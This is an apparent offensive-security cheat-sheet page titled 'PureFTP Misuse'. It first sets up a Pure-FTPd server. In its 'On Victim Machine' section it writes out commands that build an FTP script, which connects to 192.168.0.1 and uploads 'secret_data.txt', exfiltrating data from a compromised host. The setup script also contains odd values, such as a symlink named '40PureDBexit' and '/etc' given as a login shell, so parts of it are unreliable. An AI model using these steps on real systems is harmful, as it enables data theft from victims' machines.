# PureFTP Misuse

```
Description: Open-source FTP server software

apt-get update && apt-get install pure-ftpd

# Create setupftp.sh and execute script
    #!/bin/bash
    groupadd ftpgroup
    useradd -g ftpgroup -d /dev/null -s /etc ftpuser
    pure-pw useradd myftpuser -u ftpuser -d /ftphome
    pure-pw mkdb
    cd /etc/pure-ftpd/auth/
    sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
    mkdir -p /ftphome
    chown -R ftpuser:ftpgroup /ftphome/
    /etc/init.d/pure-ftpd restart

./setupftp.sh
```

# Get Service Ready
```
# Reset Password
pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd

# Commit Changes
pure-pw mkdb

# Restart Service
/etc/init.d/pure-ftpd restart
```

# On Victim Machine
```
# Create FTP Script (On Victim)
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt

# Exectue Script (on Victim)
ftp -v -n -s:ftp.txt
```

## Back to README.md
[BACK](../README.md)